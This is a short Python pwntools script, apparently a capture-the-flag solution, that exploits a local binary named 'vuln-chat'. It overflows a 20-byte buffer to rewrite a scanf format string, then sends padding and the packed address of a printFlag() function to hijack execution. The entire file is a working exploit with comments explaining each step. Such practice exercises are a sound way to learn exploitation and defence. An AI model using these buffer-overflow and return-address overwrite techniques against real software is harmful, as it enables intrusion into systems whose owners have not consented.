#!/usr/bin/python3
from pwn import *
# Connect to target process
target = process('./vuln-chat')
for i in range(1):
    print(target.recvline().decode('utf-8'))
# the first scanf takes in "%30s" into name
# Since the buffer is only 20 characters we can overwrite
# the format string so the next scanf takes in 99 chars
payload = "a"*20 + "%99s" 
target.sendline(payload)
for i in range(4):
    print(target.recvline().decode('utf-8'))
# printFlag() is at 0x0804856b
payload = b"a"*49 + p32(0x0804856b)
target.sendline(payload)
target.recvline().decode('utf-8')
log.info('Flag is '+target.recvline().decode('utf-8'))

